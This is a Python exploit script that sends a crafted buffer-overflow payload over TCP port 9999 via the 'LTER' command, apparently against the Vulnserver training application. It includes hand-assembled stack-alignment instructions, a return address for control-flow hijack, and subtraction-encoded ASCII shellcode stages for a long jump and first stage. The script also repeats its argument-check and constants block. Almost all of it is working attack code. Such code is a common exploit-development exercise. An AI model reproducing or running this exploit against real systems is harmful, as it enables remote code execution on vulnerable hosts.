#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port
# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port


# Long Jump Shell Code Generated with https://github.com/andresroldan/Automatic-ASCII-Shellcode-Subtraction-Encoder 
JUMP_ENCODE =  b'\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x69\x7c\x7f\x22\x2d'                                                                      
JUMP_ENCODE += b'\x41\x78\x77\x2b\x2d\x57\x7a\x78\x21\x50\x25\x26\x2a\x4f\x3c\x25'                                                                      
JUMP_ENCODE += b'\x41\x41\x30\x42\x2d\x70\x2c\x64\x6f\x2d\x7a\x3e\x38\x6f\x2d\x2d'                                                                      
JUMP_ENCODE += b'\x3e\x71\x21\x50'

FIRST_STAGE =  b'\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x50\x22\x73\x37\x2d'                                   
FIRST_STAGE += b'\x75\x42\x3e\x7e\x2d\x70\x25\x4f\x76\x50\x25\x26\x2a\x4f\x3c\x25'                                   
FIRST_STAGE += b'\x41\x41\x30\x42\x2d\x30\x70\x4f\x75\x2d\x4c\x5f\x76\x25\x2d\x30'                                   
FIRST_STAGE += b'\x75\x79\x57\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x3c'                                   
FIRST_STAGE += b'\x38\x30\x2d\x2d\x3e\x38\x3e\x6f\x2d\x2a\x33\x60\x33\x50\x25\x26'                                   
FIRST_STAGE += b'\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x26\x50\x5f\x38\x2d\x4a\x43'                                   
FIRST_STAGE += b'\x28\x2d\x2d\x60\x3e\x46\x32\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41'                                   
FIRST_STAGE += b'\x30\x42\x2d\x62\x23\x27\x5e\x2d\x29\x50\x37\x21\x2d\x42\x30\x39'                                   
FIRST_STAGE += b'\x52\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x48\x48\x60'                                   
FIRST_STAGE += b'\x6f\x2d\x30\x27\x4f\x38\x2d\x24\x28\x22\x26\x50\x25\x26\x2a\x4f'                                   
FIRST_STAGE += b'\x3c\x25\x41\x41\x30\x42\x2d\x2c\x3b\x2d\x21\x2d\x31\x3c\x4e\x48'                                   
FIRST_STAGE += b'\x2d\x3b\x27\x22\x33\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42'                                   
FIRST_STAGE += b'\x2d\x23\x29\x3e\x2d\x2d\x60\x41\x22\x22\x2d\x21\x28\x3e\x44\x50'                                   
FIRST_STAGE += b'\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x45\x4c\x28\x37\x2d'                                   
FIRST_STAGE += b'\x34\x23\x2d\x39\x2d\x23\x24\x3e\x27\x50\x25\x26\x2a\x4f\x3c\x25'                                   
FIRST_STAGE += b'\x41\x41\x30\x42\x2d\x3e\x45\x44\x39\x2d\x7b\x42\x26\x5a\x2d\x6c'                                   
FIRST_STAGE += b'\x24\x2d\x3e\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x7f'                                   
FIRST_STAGE += b'\x6a\x25\x3b\x2d\x7f\x6f\x38\x60\x2d\x7f\x39\x3d\x33\x50'

# Generate a payload the server expects: Command followed by Data
PAYLOAD = (
    b'LTER .' +
    # Padding in the event we do not jump perfectly to the start of the array.
    # We use 'A' since the NOP command `0x90` is a bad character!
    b'A' * 64 + 
    b'\x54' +                   # PUSH ESP
    b'\x58' +                   # POP EAX
    b'\x66\x2d\x69\x02' +       # SUB AX,0x0269
    b'\x66\x2d\x69\x02' +       # SUB AX,0x0269
    b'\x66\x2d\x69\x02' +       # SUB AX,0x0269
    b'\x66\x2d\x69\x02' +       # SUB AX,0x0269 # You can comment this one out if desired.
    b'\x50' +                   # PUSH EAX
    b'\x5c' +                   # POP ESP
    FIRST_STAGE + 
    b'A' * (3574 - (64 + 20 + 79 + 4 + len(FIRST_STAGE))) +
    # Align stack for long jump
    b'\x54' +           # PUSH ESP
    b'\x58' +           # POP EAX
    b'\x2c\x30' +       # SUB AL,30
    b'\x50' +           # PUSH EAX
    b'\x5c' +           # POP ESP
    JUMP_ENCODE +
    b'A' * (79 - (6 + len(JUMP_ENCODE))) +   # Fill the rest of our buffer with A
    # JNZ SHORT +0x10: Will jump if ZF is 0
    b'\x75\x08' +
    # JZ SHORT +0x8: This will only happen if the previous jump did not happen and ZF is 1
    b'\x74\x06' +
    # 6250172B    5F                          POP EDI
    # 6250172C    5D                          POP EBP
    # 6250172D    C3                          RETN
    struct.pack('<L', 0x6250271B) +
    b'C' * 2 +
    # Align stack pointer
    b'\x54' +                   # PUSH ESP
    b'\x58' +                   # POP EAX
    b'\x66\x05\x64\x12' +       # ADD AX,0x097F
    b'\x50' +                   # PUSH EAX
    b'\x5c' +                   # POP ESP
    b'\x25\x4a\x4d\x4e\x55' +   # AND EAX,0x554E4D4A
    b'\x25\x35\x32\x31\x2a' +   # AND EAX,0x2A313235
    b'\x05\x75\x40\x48\x48' +   # ADD EAX,48484075 
    b'\x05\x76\x40\x48\x48' +   # ADD EAX,48484076
    b'\x50' +                   # PUSH EAX
    b'C' * (5000 - (3574 + 4 + 2 + 8))
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
